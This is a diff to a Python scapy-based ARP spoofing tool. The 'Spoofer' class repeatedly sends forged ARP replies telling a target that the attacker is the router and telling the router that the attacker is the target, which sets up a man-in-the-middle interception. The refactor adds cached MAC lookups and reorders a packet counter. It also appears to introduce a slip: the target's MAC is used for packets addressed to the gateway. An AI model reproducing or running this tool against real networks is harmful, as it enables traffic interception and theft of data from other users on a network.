@@ -20,6 +20,12 @@ from subprocess import Popen
 from utils.enable_port_fwd import enable_port_fwd
 
 class Spoofer:
+    def __init__(self, target_ip, gateway_ip):
+        self.target_ip = target_ip
+        self.gateway_ip = gateway_ip
+        self.dest_mac = self.resolve_mac_from_ip(self.target_ip)
+        self.src_mac = self.resolve_mac_from_ip(self.gateway_ip)
+        
     def resolve_mac_from_ip(self, ip_address):
         """
         Accepts as input an IP address, resolves its corresponding MAC address,
@@ -38,13 +44,13 @@ class Spoofer:
         Sends packets to manipulate the target's
         IP tables to associate the controller with the spoof IP.
         """
-        target_mac = self.resolve_mac_from_ip(target_ip)
-        arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+        arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=self.dest_mac, psrc=spoof_ip)
         scapy.send(arp_response_packet, verbose=False)
 
     def restore_defaults(self, dest_ip, src_ip):
         """
         Restores target(s) ARP tables.
+        TODO fix resolve so it isnt being called again. Not necessary here.
         """
         dest_mac = self.resolve_mac_from_ip(dest_ip)
         src_mac = self.resolve_mac_from_ip(src_ip)
@@ -58,8 +64,8 @@ class Spoofer:
             self.spoof(target_ip, gateway_ip) # client, I am the router
             self.spoof(gateway_ip, target_ip) # router, I am the client
             # python3 #print(f"\r[+] Transaction successful. Packets sent: str(sent_packets_count)", end="")
-            print("\r[+] Transaction successful. Packets sent: " + str(sent_packets_count)),
             sent_packets_count += 2
+            print("\r[+] Transaction successful. Packets sent: " + str(sent_packets_count)),
             sys.stdout.flush()
             time.sleep(2)
 
